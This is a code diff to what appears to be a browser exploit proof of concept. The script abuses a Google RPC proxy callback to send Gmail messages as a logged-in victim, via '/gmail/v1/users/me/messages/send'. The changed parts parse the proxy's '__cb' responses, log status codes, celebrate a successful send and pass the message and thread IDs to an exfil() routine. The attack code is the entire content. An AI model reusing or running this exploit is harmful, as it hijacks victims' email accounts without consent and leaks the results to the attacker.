@@ -123,28 +123,31 @@ function init(send) {
       return;
     }
 
-    // Callback: proxy responds {f:"_callbacks_.callId", a:[null, responses], ...}
-    if (!msg.f || !msg.f.includes('_callbacks_')) return;
-    log('ok', 'Callback: ' + msg.f);
-    const [err, responses] = Array.isArray(msg.a) ? msg.a : [null, null];
-    if (err) { log('warn', 'RPC error: ' + JSON.stringify(err)); return; }
-    if (!Array.isArray(responses)) return;
+    // Callback format: {s:"__cb", f:"", a:[callId, responseMapJSON]}
+    // responseMapJSON = {"/relative_url": {data:{status,body}}}
+    if (msg.s !== '__cb') return;
+    log('ok', '__cb received, callId=' + msg.a[0]);
+    let responseMap;
+    try { responseMap = JSON.parse(msg.a[1]); } catch(e) {
+      log('warn', 'Failed to parse response: ' + String(msg.a[1]).substring(0, 200)); return;
+    }
 
-    responses.forEach((resp, idx) => {
-      if (!resp) return;
-      log((resp.status === 200 ? 'crit' : 'warn'), '[' + idx + '] HTTP ' + resp.status + ' — ' + String(resp.body).substring(0, 400));
-      if (resp.status === 200) {
+    Object.entries(responseMap).forEach(([relUrl, wrapper]) => {
+      const status = wrapper.data && wrapper.data.status;
+      const bodyStr = wrapper.data && wrapper.data.body;
+      log((status === 200 ? 'crit' : 'warn'), relUrl + ' → HTTP ' + status + ' — ' + String(bodyStr).substring(0, 300));
+      if (status === 200) {
         let data;
-        try { data = JSON.parse(resp.body); } catch(e) { data = {raw: resp.body}; }
+        try { data = JSON.parse(bodyStr); } catch(e) { data = {raw: bodyStr}; }
         if (data.id) {
           log('crit', '🎯 ✅ EMAIL SENT! Gmail Message ID: ' + data.id);
           log('crit', '   threadId: ' + data.threadId);
           exfil({ type: 'gmail_send', messageId: data.id, threadId: data.threadId });
         }
-      } else if (resp.status === 401) {
+      } else if (status === 401) {
         log('warn', '401 — not logged into Google on this browser');
-      } else if (resp.status === 403) {
-        log('warn', '403 — ' + resp.body.substring(0, 200));
+      } else if (status === 403) {
+        log('warn', '403 — ' + String(bodyStr).substring(0, 200));
       }
     });
   };
@@ -174,11 +177,10 @@ function sendEmail(rpcToken) {
 
   const requests = [
     {
-      url: '/gmail/v1/users/me/messages/send',
+      relative_url: '/gmail/v1/users/me/messages/send',
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ raw: raw }),
-      responseExpected: true
+      body: JSON.stringify({ raw: raw })
     }
   ];
 
